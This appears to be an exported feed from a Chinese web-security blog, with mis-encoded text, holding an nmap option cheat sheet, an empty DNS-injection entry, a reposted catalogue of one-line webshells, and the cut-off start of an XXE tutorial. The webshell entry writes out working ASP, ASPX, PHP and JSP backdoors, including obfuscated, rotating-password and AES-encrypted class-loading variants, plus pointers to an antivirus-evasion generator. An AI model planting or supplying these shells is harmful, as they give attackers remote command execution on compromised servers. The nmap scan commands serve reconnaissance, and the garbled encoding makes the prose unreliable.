        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>-sT     TCP connect()æ‰«æï¼Œè¿™ç§æ–¹å¼ä¼šåœ¨ç›®æ ‡ä¸»æœºçš„æ—¥å¿—ä¸­è®°å½•å¤§æ‰¹è¿æ¥è¯·æ±‚å’Œé”™è¯¯ä¿¡æ¯ã€‚<br>-sS     åŠå¼€æ‰«æï¼Œå¾ˆå°‘æœ‰ç³»ç»Ÿèƒ½æŠŠå®ƒè®°å…¥ç³»ç»Ÿæ—¥å¿—ã€‚ä¸è¿‡ï¼Œéœ€è¦Rootæƒé™ã€‚<br>-sF  -sN     ç§˜å¯†FINæ•°æ®åŒ…æ‰«æã€Xmas Treeã€Nullæ‰«ææ¨¡å¼<br>-sP     pingæ‰«æï¼ŒNmapåœ¨æ‰«æç«¯å£æ—¶ï¼Œé»˜è®¤éƒ½ä¼šä½¿ç”¨pingæ‰«æï¼Œåªæœ‰ä¸»æœºå­˜æ´»ï¼ŒNmapæ‰ä¼šç»§ç»­æ‰«æã€‚<br>-sU     UDPæ‰«æï¼Œä½†UDPæ‰«ææ˜¯ä¸å¯é çš„<br>-sA     è¿™é¡¹é«˜çº§çš„æ‰«ææ–¹æ³•é€šå¸¸ç”¨æ¥ç©¿è¿‡é˜²ç«å¢™çš„è§„åˆ™é›†<br>-sV     æ¢æµ‹ç«¯å£æœåŠ¡ç‰ˆæœ¬<br>-Pn     æ‰«æä¹‹å‰ä¸éœ€è¦ç”¨pingå‘½ä»¤ï¼Œæœ‰äº›é˜²ç«å¢™ç¦æ­¢pingå‘½ä»¤ã€‚å¯ä»¥ä½¿ç”¨æ­¤é€‰é¡¹è¿›è¡Œæ‰«æ<br>-sn pingæ¢æµ‹æ‰«æä¸»æœºï¼Œ ä¸è¿›è¡Œç«¯å£æ‰«æ ï¼ˆæµ‹è¯•è¿‡å¯¹æ–¹ä¸»æœºæŠŠicmpåŒ…éƒ½ä¸¢å¼ƒæ‰ï¼Œä¾ç„¶èƒ½æ£€æµ‹åˆ°å¯¹æ–¹å¼€æœºçŠ¶æ€ï¼‰</p><p>-v     æ˜¾ç¤ºæ‰«æè¿‡ç¨‹ï¼Œæ¨èä½¿ç”¨<br>-h     å¸®åŠ©é€‰é¡¹ï¼Œæ˜¯æœ€æ¸…æ¥šçš„å¸®åŠ©æ–‡æ¡£<br>-p     æŒ‡å®šç«¯å£ï¼Œå¦‚â€œ1-65535ã€1433ã€135ã€22ã€80â€ç­‰<br>-O     å¯ç”¨è¿œç¨‹æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼Œå­˜åœ¨è¯¯æŠ¥<br>-A     å…¨é¢ç³»ç»Ÿæ£€æµ‹ã€å¯ç”¨è„šæœ¬æ£€æµ‹ã€æ‰«æç­‰<br>-oN/-oX/-oG     å°†æŠ¥å‘Šå†™å…¥æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯æ­£å¸¸ã€XMLã€grepable ä¸‰ç§æ ¼å¼<br>-T4     é’ˆå¯¹TCPç«¯å£ç¦æ­¢åŠ¨æ€æ‰«æå»¶è¿Ÿè¶…è¿‡10ms<br>-iL     è¯»å–ä¸»æœºåˆ—è¡¨ï¼Œä¾‹å¦‚ï¼Œâ€œ-iL C:\ip.txtâ€<br>-nï¼šä¸åšDNSè§£æ</p><ul><li>æ‰«ææŒ‡å®šIPæ‰€å¼€æ”¾çš„ç«¯å£ï¼šnmap -sS -p 1-65535 -v XXX.XXX.XXX.XXX</li><li>æ‰«æCæ®µå­˜æ´»ä¸»æœºï¼šnmap -sP XXX.XXX.XXX.XXX/24</li><li>æŒ‡å®šç«¯å£æ‰«æï¼šnmap -p 80,1433,22,1521 XXX.XXX.XXX.XXX</li><li>æ¢æµ‹ä¸»æœºæ“ä½œç³»ç»Ÿï¼šnmap -o XXX.XXX.XXX.XXX</li><li>å…¨é¢çš„ç³»ç»Ÿæ¢æµ‹ï¼šnmap -v -A XXX.XXX.XXX.XXXï¼ˆNmapé»˜è®¤æ‰«æä¸»æœº1000ä¸ªé«˜å±ç«¯å£ï¼‰</li><li>æ¢æµ‹æŒ‡å®šç½‘æ®µï¼šnmap XXX.XXX.XXX.XXX-XXX</li><li>ç©¿é€é˜²ç«å¢™è¿›è¡Œæ‰«æï¼šnmap -Pn -A XXX.XXX.XXX.XXXï¼ˆXXX.XXX.XXX.XXXç¦æ­¢ç”¨pingçš„ï¼‰</li><li>ä½¿ç”¨è„šæœ¬ï¼Œæ‰«æWebæ•æ„Ÿç›®å½•ï¼šnmap -p 80 â€“script=http-enum.nse XXX.XXX.XXX.XXX</li></ul><p>å‚è€ƒ:<a href="https://www.cnblogs.com/nmap/p/6232969.html" target="_blank" rel="noopener">https://www.cnblogs.com/nmap/p/6232969.html</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Dnsæ³¨å…¥</title>
      <link href="/2019/07/18/Dns%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/07/18/Dns%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>ä¸€å¥è¯æœ¨é©¬(è½¬)</title>
      <link href="/2019/07/18/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-%E8%BD%AC/"/>
      <url>/2019/07/18/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-%E8%BD%AC/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="å¸¸è§çš„ä¸€å¥è¯"><a href="#å¸¸è§çš„ä¸€å¥è¯" class="headerlink" title="å¸¸è§çš„ä¸€å¥è¯"></a>å¸¸è§çš„ä¸€å¥è¯</h1><p>ASP:<code>&lt;%eval request(&quot;pass&quot;)%&gt;</code></p><p>ASPX: <code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%Response.Write(eval(Request.Item[&quot;z&quot;],&quot;unsafe&quot;));%&gt;</code></p><p>PHP:<code>&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;</code></p><p>JSP:  <code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;//æ— å›æ˜¾ç¤ºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</code></p><h1 id="ç®€å•å˜å½¢"><a href="#ç®€å•å˜å½¢" class="headerlink" title="ç®€å•å˜å½¢"></a>ç®€å•å˜å½¢</h1><p>ASP:<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval<span class="string">""</span>&amp;(<span class="string">"e"</span>&amp;<span class="string">"v"</span>&amp;<span class="string">"a"</span>&amp;<span class="string">"l"</span>&amp;<span class="string">"("</span>&amp;<span class="string">"r"</span>&amp;<span class="string">"e"</span>&amp;<span class="string">"q"</span>&amp;<span class="string">"u"</span>&amp;<span class="string">"e"</span>&amp;<span class="string">"s"</span>&amp;<span class="string">"t"</span>&amp;<span class="string">"("</span>&amp;<span class="string">"0"</span>&amp;<span class="string">"-"</span>&amp;<span class="string">"2"</span>&amp;<span class="string">"-"</span>&amp;<span class="string">"5"</span>&amp;<span class="string">")"</span>&amp;<span class="string">")"</span>)%&gt;<span class="comment">//-7</span></span><br></pre></td></tr></table></figure></p><p>ASPX:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language = Jscript %&gt;</span><br><span class="line">&lt;%var<span class="comment">/*-/*-*/</span>P<span class="comment">/*-/*-*/</span>=<span class="comment">/*-/*-*/</span><span class="string">"e"</span>+<span class="string">"v"</span>+<span class="comment">/*-/*-*/</span></span><br><span class="line"><span class="string">"a"</span>+<span class="string">"l"</span>+<span class="string">"("</span>+<span class="string">"R"</span>+<span class="string">"e"</span>+<span class="comment">/*-/*-*/</span><span class="string">"q"</span>+<span class="string">"u"</span>+<span class="string">"e"</span><span class="comment">/*-/*-*/</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+</span><br><span class="line"><span class="string">"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"</span>+</span><br><span class="line"><span class="string">","</span>+<span class="string">"\""</span>+<span class="string">"u"</span>+<span class="string">"n"</span>+<span class="string">"s"</span><span class="comment">/*-/*-*/</span>+<span class="string">"a"</span>+<span class="string">"f"</span>+<span class="string">"e"</span>+<span class="string">"\""</span>+<span class="string">")"</span>;<span class="keyword">eval</span></span><br><span class="line">(<span class="comment">/*-/*-*/</span>P<span class="comment">/*-/*-*/</span>,<span class="comment">/*-/*-*/</span><span class="string">"u"</span>+<span class="string">"n"</span>+<span class="string">"s"</span><span class="comment">/*-/*-*/</span>+<span class="string">"a"</span>+<span class="string">"f"</span>+<span class="string">"e"</span><span class="comment">/*-/*-*/</span>);%&gt;<span class="comment">//-7</span></span><br></pre></td></tr></table></figure><p>PHP:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> $_GET[a]($_GET[b]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>JSP:<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">request</span>.getParameter(<span class="string">"f"</span>)!=<span class="literal">null</span>)(<span class="keyword">new</span> </span><br><span class="line">java.io.FileOutputStream(application.getRealPath(<span class="string">"\\"</span>)+<span class="built_in">request</span>.getParameter(<span class="string">"f"</span>))).write(<span class="built_in">request</span>.getParameter(<span class="string">"t"</span>).getBytes());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><h1 id="äºŒæ¬¡å˜å½¢"><a href="#äºŒæ¬¡å˜å½¢" class="headerlink" title="äºŒæ¬¡å˜å½¢"></a>äºŒæ¬¡å˜å½¢</h1><figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">ASP:</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="vbscript">&lt;%<span class="keyword">if</span> <span class="built_in">request</span> (<span class="string">"MH"</span>)&lt;&gt;<span class="string">""</span><span class="keyword">then</span> session(<span class="string">"MH"</span>)=<span class="built_in">request</span>(<span class="string">"MH"</span>):<span class="keyword">end</span> </span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>:<span class="keyword">if</span> session(<span class="string">"MH"</span>)&lt;&gt;<span class="string">""</span> <span class="keyword">then</span> <span class="keyword">execute</span> session(<span class="string">"MH"</span>)%&gt;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">ASPX:</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="vbscript">&lt;%@ Page </span></span><br><span class="line"><span class="vbscript">Language=<span class="string">"Jscript"</span>%&gt;</span><span class="xml"></span><span class="vbscript">&lt;%<span class="built_in">eval</span>(<span class="built_in">Request</span>.Item[FormsAuthentication.HashPasswordForStoringInConfigFile(<span class="built_in">String</span>.Format(<span class="string">"&#123;0:yyyyMMdd&#125;"</span>,DateTime.<span class="built_in">Now</span>.ToUniversalTime())+<span class="string">"37E4DD20C310142564FC483DB1132F36"</span>,</span></span><br><span class="line"><span class="vbscript"> <span class="string">"MD5"</span>).ToUpper()],<span class="string">"unsafe"</span>);%&gt;</span><span class="xml">//éšæ—¥æœŸå˜åŒ–çš„è¿æ¥å¯†ç </span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">PHP:<span class="php"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">JSPï¼š</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="vbscript">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(<span class="built_in">request</span>.getParameter(<span class="string">"f"</span>)).write(<span class="built_in">request</span>.getParameter(<span class="string">"c"</span>).getBytes());%&gt;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h1 id="ä¸‰æ¬¡å˜å½¢"><a href="#ä¸‰æ¬¡å˜å½¢" class="headerlink" title="ä¸‰æ¬¡å˜å½¢"></a>ä¸‰æ¬¡å˜å½¢</h1><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ASP</span>:&lt;%<span class="meta">@Page</span> <span class="type">Language</span>=<span class="string">"C#"</span> %&gt;&lt;%<span class="meta">@Import</span> namespace=<span class="string">"System.Reflection"</span>%&gt;&lt;%<span class="keyword">if</span> (<span class="type">Request</span>[<span class="string">"pass"</span>]!=<span class="literal">null</span>)&#123; <span class="type">Session</span>.<span class="type">Add</span>(<span class="string">"k"</span>, <span class="type">Guid</span>.<span class="type">NewGuid</span>().<span class="type">ToString</span>().<span class="type">Replace</span>(<span class="string">"-"</span>, <span class="string">""</span>).<span class="type">Substring</span>(<span class="number">16</span>)); <span class="type">Response</span>.<span class="type">Write</span>(<span class="type">Session</span>[<span class="number">0</span>]); <span class="keyword">return</span>;&#125;byte[] k = <span class="type">Encoding</span>.<span class="type">Default</span>.<span class="type">GetBytes</span>(<span class="type">Session</span>[<span class="number">0</span>] + <span class="string">""</span>),c = <span class="type">Request</span>.<span class="type">BinaryRead</span>(<span class="type">Request</span>.<span class="type">ContentLength</span>);<span class="type">Assembly</span>.<span class="type">Load</span>(<span class="keyword">new</span> <span class="type">System</span>.<span class="type">Security</span>.<span class="type">Cryptography</span>.<span class="type">RijndaelManaged</span>().<span class="type">CreateDecryptor</span>(k, k).<span class="type">TransformFinalBlock</span>(c, <span class="number">0</span>, c.<span class="type">Length</span>)).<span class="type">CreateInstance</span>(<span class="string">"U"</span>).<span class="type">Equals</span>(<span class="keyword">this</span>);%&gt;<span class="comment">//èšå‰‘ä¸­çš„ä¸€å¥è¯</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">PHP</span>:&lt;?php session_start();isset($_GET[<span class="symbol">'pas</span>s'])?print $_SESSION['k']=substr(md5(uniqid(rand())),<span class="number">16</span>):($b=explode('|',openssl_decrypt(file_get_contents(<span class="string">"php://input"</span>), <span class="string">"AES128"</span>, $_SESSION['k'])))&amp;call_user_func($b[<span class="number">0</span>],$b[<span class="number">1</span>]);?&gt;<span class="comment">//èšå‰‘ä¸­çš„ä¸€å¥è¯</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">JSP</span>:&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;<span class="type">U</span>(<span class="type">ClassLoader</span> c)&#123;<span class="keyword">super</span>(c);&#125;public <span class="type">Class</span> g(byte []b)&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">"pass"</span>)!=<span class="literal">null</span>)&#123;<span class="type">String</span> k=(<span class="string">""</span>+<span class="type">UUID</span>.randomUUID()).replace(<span class="string">"-"</span>,<span class="string">""</span>).substring(<span class="number">16</span>);session.putValue(<span class="string">"u"</span>,k);out.print(k);<span class="keyword">return</span>;&#125;<span class="type">Cipher</span> c=<span class="type">Cipher</span>.getInstance(<span class="string">"AES"</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> <span class="type">SecretKeySpec</span>((session.getValue(<span class="string">"u"</span>)+<span class="string">""</span>).getBytes(),<span class="string">"AES"</span>));<span class="keyword">new</span> <span class="type">U</span>(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.<span class="type">BASE64Decoder</span>().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;<span class="comment">//èšå‰‘ä¸­çš„ä¸€å¥è¯</span></span><br></pre></td></tr></table></figure><h1 id="å››æ¬¡å˜å½¢"><a href="#å››æ¬¡å˜å½¢" class="headerlink" title="å››æ¬¡å˜å½¢"></a>å››æ¬¡å˜å½¢</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€åˆ©ç”¨éšæœºå¼‚æˆ–æ— é™å…æ€dç›¾èšå‰‘ç‰ˆï¼š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">é¡¹ç›®åœ°å€ï¼šhttps:<span class="regexp">//gi</span>thub.com<span class="regexp">/yzddmr6/</span>as_webshell_venom</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ã€åˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ï¼š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ–‡ç« åœ°å€ï¼šhttps:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">2799</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XXEæ¼æ´åŸç†åŠå®æˆ˜</title>
      <link href="/2019/06/01/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/"/>
      <url>/2019/06/01/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br>é¦–å‘äº  Ms08067å®‰å…¨å®éªŒå®¤</p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å†™è¿™ç¯‡çš„ä¸»è¦ç›®çš„æ˜¯å› ä¸ºå¾ˆå¤šCTFerè¿˜æœ‰ä¸€äº›å®‰å…¨äººå‘˜ä¸æ˜¯å¾ˆæ¸…æ¥šxxeæ¼æ´ï¼Œè¿˜æœ‰åœ¨é¢è¯•å½“ä¸­ï¼Œxxeæ¼æ´ä¹Ÿç»å¸¸è¢«é—®åˆ°ï¼Œæ‰€ä»¥å°±å†™è¿™ä¹ˆä¸€ç¯‡æ–‡ç« æ¥å­¦ä¹ xxeæ¼æ´.<br>æœ¬ç¯‡ä¼šç»“åˆä¸€äº›é¶åœºè¿˜æœ‰CTFæ¥è¿›è¡Œè®²è§£</p><h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><p>é¦–å…ˆæ¥ä»‹ç»ä¸€ä¸‹XMLå’ŒDTD</p><p>XMLè¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®,è¿™é‡Œæä¸€ä¸‹xmlä¸htmlçš„åŒºåˆ«:HTML æ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“ä¿¡æ¯</p><p>è€ŒDTDå®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—,å®ƒä½¿ç”¨ä¸€ç³»åˆ—çš„åˆæ³•å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£ç»“æ„,DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</p><h2 id="XMLå’ŒDTDåŸºç¡€"><a href="#XMLå’ŒDTDåŸºç¡€" class="headerlink" title="XMLå’ŒDTDåŸºç¡€"></a>XMLå’ŒDTDåŸºç¡€</h2><p>ä¸€ä¸ª XML æ–‡æ¡£å®ä¾‹ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ç¬¬ä¸€è¡Œæ˜¯ XML å£°æ˜ã€‚å®ƒå®šä¹‰ XML çš„ç‰ˆæœ¬ (1.0) å’Œæ‰€ä½¿ç”¨çš„ç¼–ç  (ISO-8859-1 = Latin-1/è¥¿æ¬§å­—ç¬¦é›†)ã€‚</p><p>æ¥ä¸‹æ¥åŠ ä¸ŠDTDè¿›è¡Œå£°æ˜</p><p><strong>å†…éƒ¨çš„ DOCTYPE å£°æ˜</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [          //å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£ã€‚</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT note (to,from,heading,body)&gt; //å®šä¹‰ note å…ƒç´ æœ‰å››ä¸ªå…ƒç´ ï¼š"toã€fromã€heading,ã€body"</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT to      (#PCDATA)&gt;  //å®šä¹‰ to å…ƒç´ ä¸º "#PCDATA" ç±»å‹</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT from    (#PCDATA)&gt;   //å®šä¹‰ from å…ƒç´ ä¸º "#PCDATA" ç±»å‹</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT heading (#PCDATA)&gt;  // heading å…ƒç´ ä¸º "#PCDATA" ç±»å‹</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT body    (#PCDATA)&gt;  //å®šä¹‰ body å…ƒç´ ä¸º "#PCDATA" ç±»å‹</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTDå…ƒç´ </strong><br>åœ¨ä¸€ä¸ª DTD ä¸­ï¼Œå…ƒç´ é€šè¿‡å…ƒç´ å£°æ˜æ¥è¿›è¡Œå£°æ˜ã€‚</p><p>å£°æ˜ä¸€ä¸ªå…ƒç´ <br>åœ¨ DTD ä¸­ï¼ŒXML å…ƒç´ é€šè¿‡å…ƒç´ å£°æ˜æ¥è¿›è¡Œå£°æ˜ã€‚å…ƒç´ å£°æ˜ä½¿ç”¨ä¸‹é¢çš„è¯­æ³•ï¼š</p><p>åªæœ‰ PCDATA çš„å…ƒç´ <br>åªæœ‰ PCDATA çš„å…ƒç´ é€šè¿‡åœ†æ‹¬å·ä¸­çš„ #PCDATA è¿›è¡Œå£°æ˜ï¼š</p><p>&lt;!ELEMENT å…ƒç´ åç§° (#PCDATA)&gt;<br>ä¾‹å­ï¼š<br><code>&lt;!ELEMENT from (#PCDATA)&gt;</code></p><p>å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ <br>é€šè¿‡ç±»åˆ«å…³é”®è¯ ANY å£°æ˜çš„å…ƒç´ ï¼Œå¯åŒ…å«ä»»ä½•å¯è§£ææ•°æ®çš„ç»„åˆï¼š</p><p>&lt;!ELEMENT å…ƒç´ åç§° ANY&gt;<br>ä¾‹å­ï¼š<br><code>&lt;!ELEMENT note ANY&gt;</code></p><p>å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ <br>å¸¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå­å…ƒç´ çš„å…ƒç´ é€šè¿‡åœ†æ‹¬å·ä¸­çš„å­å…ƒç´ åè¿›è¡Œå£°æ˜ï¼š</p><p>&lt;!ELEMENT å…ƒç´ åç§° (å­å…ƒç´ åç§° 1)&gt;<br>æˆ–è€…</p><p>&lt;!ELEMENT å…ƒç´ åç§° (å­å…ƒç´ åç§° 1,å­å…ƒç´ åç§° 2,â€¦..)&gt;<br>ä¾‹å­ï¼š<br><code>&lt;!ELEMENT note (to,from,heading,body)&gt;</code></p><p>å£°æ˜åªå‡ºç°ä¸€æ¬¡çš„å…ƒç´ <br>&lt;!ELEMENT å…ƒç´ åç§° (å­å…ƒç´ åç§°)&gt;<br>ä¾‹å­ï¼š<br><code>&lt;!ELEMENT note (message)&gt;</code><br>ä¸Šé¢çš„ä¾‹å­å£°æ˜äº†ï¼šmessage å­å…ƒç´ å¿…é¡»å‡ºç°ä¸€æ¬¡ï¼Œå¹¶ä¸”å¿…é¡»åªåœ¨ â€œnoteâ€ å…ƒç´ ä¸­å‡ºç°ä¸€æ¬¡ã€‚</p><p><strong>å¤–éƒ¨æ–‡æ¡£å£°æ˜</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´ <span class="built_in"> SYSTEM </span><span class="string">"æ–‡ä»¶å"</span>&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ª XML æ–‡æ¡£å’Œä¸Šé¢çš„ XML 